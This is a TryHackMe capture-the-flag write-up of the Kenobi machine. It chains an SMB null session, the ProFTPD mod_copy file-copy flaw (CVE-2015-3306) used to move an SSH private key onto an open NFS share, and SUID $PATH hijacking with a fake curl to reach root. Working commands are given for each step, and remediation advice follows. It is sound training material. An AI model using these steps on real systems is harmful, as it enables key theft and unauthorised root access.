# TryHackMe: Kenobi — Red Team Walkthrough & Write-up

* **Room Link:** [TryHackMe - Kenobi](https://tryhackme.com/room/kenobi)
* **Target OS:** Ubuntu Linux
* **Difficulty:** Easy
* **Key Techniques:** SMB Null Session, ProFTPD 1.3.5 Exploitation (CVE-2015-3306), NFS Mounting, SUID $PATH Hijacking

---

## 1. Executive Summary
This write-up documents the penetration test of the **Kenobi** Linux machine on TryHackMe. The attack chain demonstrates how an unauthenticated attacker can chain **SMB information disclosure**, an **unauthenticated file copy vulnerability in ProFTPD 1.3.5 (`CVE-2015-3306`)**, and a **misconfigured NFS export** to steal an SSH private key, followed by **SUID `$PATH` hijacking** to achieve full `root` privileges.

---

## 2. Reconnaissance (Nmap Scan)
I started by scanning the target machine (`10.48.145.150`) to identify open ports and running services:

    nmap -sC -sV -Pn 10.48.145.150

**Open Ports Found:**
* **21/tcp:** ProFTPD 1.3.5
* **22/tcp:** OpenSSH 8.2p1 Ubuntu
* **80/tcp:** Apache httpd 2.4.41
* **111/tcp & 2049/tcp:** RPCbind / NFS (v3-4)
* **139/tcp & 445/tcp:** Samba smbd 4

---

## 3. Enumeration

### 3.1 SMB Null Session (Port 445)
Listing the SMB shares without a password revealed three shares (`print$`, `anonymous`, and `IPC$`):

    smbclient -L //10.48.145.150/ -N
    smbclient //10.48.145.150/anonymous -N

Inside the `anonymous` share, I downloaded `log.txt`. Reading this file exposed two critical pieces of information:
1. The user `kenobi` generated an SSH private key stored at `/home/kenobi/.ssh/id_rsa`.
2. The `ProFTPD` server runs under the `kenobi` user permissions.

### 3.2 NFS Export Enumeration (Port 2049)
Checking the exported NFS directories showed that the `/var` directory was accessible to anyone on the network:

    showmount -e 10.48.145.150

* **Result:** `/var *`

---

## 4. Initial Foothold (ProFTPD CVE-2015-3306 + NFS)

Checking `searchsploit proftpd 1.3.5` revealed 4 exploits targeting the `mod_copy` module (`SITE CPFR` and `SITE CPTO`), which allows unauthenticated users to copy files anywhere on the server.

1. **Copied `id_rsa` to the `/var/tmp` NFS share via Port 21:**

       nc 10.48.145.150 21
       SITE CPFR /home/kenobi/.ssh/id_rsa
       SITE CPTO /var/tmp/id_rsa

2. **Mounted the `/var` NFS share locally and extracted the SSH key:**

       mkdir /mnt/kenobiNFS
       sudo mount 10.48.145.150:/var /mnt/kenobiNFS
       cp /mnt/kenobiNFS/tmp/id_rsa .
       chmod 600 id_rsa
       ssh -i id_rsa kenobi@10.48.145.150

3. **Captured the User Flag:**

       cat /home/kenobi/user.txt
       d0b0f3f5************************ [REDACTED]

---

## 5. Privilege Escalation (SUID $PATH Hijacking)

Searching for binaries with the SUID bit set revealed a custom binary at `/usr/bin/menu`:

    find / -perm -u=s -type f 2>/dev/null

Running `strings /usr/bin/menu` showed that the binary calls system commands (`curl`, `uname`, `ifconfig`) with `root` privileges **without using their full paths** (e.g., calling `curl` instead of `/usr/bin/curl`).

**Exploitation Steps:**
1. Created a fake `curl` binary inside `/tmp` that spawns a shell, and added `/tmp` to the beginning of the `$PATH` variable:

       cd /tmp
       echo /bin/sh > curl
       chmod 777 curl
       export PATH=/tmp:$PATH
       /usr/bin/menu

2. Selected option `1` (`status check`), which executed `/tmp/curl` as `root` and granted a root shell (`root@kenobi:/tmp#`).
3. Captured the Root Flag:

       /bin/cat /root/root.txt
       177b3cd8************************ [REDACTED]

---

## 6. Remediation
* **SMB:** Disable anonymous/guest access on sensitive shares.
* **ProFTPD:** Upgrade ProFTPD or disable `mod_copy`, and run the FTP service under an isolated, low-privilege `ftp` account.
* **NFS:** Remove `/var` from exported mounts or restrict access to trusted internal IPs.
* **SUID Binaries:** Always specify absolute paths (e.g., `/usr/bin/curl`) when calling system binaries inside privileged programs.
